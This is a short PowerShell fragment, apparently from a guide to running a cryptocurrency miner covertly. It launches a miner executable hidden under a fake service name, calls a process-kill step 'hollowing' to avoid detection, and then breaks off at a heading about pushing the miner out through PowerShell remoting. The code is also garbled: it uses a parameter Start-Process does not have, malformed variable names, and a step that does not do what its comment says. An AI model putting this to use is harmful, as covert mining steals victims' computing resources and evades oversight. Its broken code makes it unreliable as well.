$minerPath = "C:\Temp\miner.exe"
$minerArgs = "-n 10 -t 5"
$processName = "MyService"

# Create a new process with a fake name
Start-Process -FilePath $minerPath -ArgumentList $minerArgs -Name $processName -WindowStyle Hidden

# Hollow out the process to avoid detection
$ Process = Get-Process -Name $processName
$ Process | ForEach-Object { $_.Kill() }
```
Deploy the miner script using PowerShell remoting:
```powershell
